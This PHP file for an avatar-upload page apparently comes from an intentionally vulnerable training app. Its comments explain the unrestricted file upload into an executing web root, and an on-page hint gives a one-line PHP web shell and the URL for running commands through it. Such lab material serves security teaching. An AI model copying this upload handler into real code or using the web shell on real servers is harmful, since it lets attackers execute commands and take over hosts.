<?php
require_login();
$msg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['avatar'])) {
    // VULN: arbitrary file upload with NO extension allow-list, saved with
    // the client-supplied filename straight into the public, PHP-executing
    // webroot. Unlike the Node/Flask versions of this app, an uploaded
    // "shell.php" here is immediately remote code execution the moment
    // anyone (including the attacker) visits /uploads/shell.php — Apache's
    // PHP module will execute it like any other script.
    $dest = __DIR__ . '/../uploads/' . $_FILES['avatar']['name'];
    move_uploaded_file($_FILES['avatar']['tmp_name'], $dest);
    $msg = 'Uploaded to /uploads/' . htmlspecialchars($_FILES['avatar']['name']);
}
?>
<h2>Profile: <?= htmlspecialchars(current_user()['username']) ?></h2>
<form method="post" enctype="multipart/form-data">
  <input type="file" name="avatar">
  <button type="submit">Upload avatar</button>
</form>
<p><?= $msg ?></p>
<p style="font-size:12px;color:#888;">
  Try uploading a file named shell.php containing &lt;?php system($_GET['c']); ?&gt;,
  then visit /uploads/shell.php?c=id
</p>
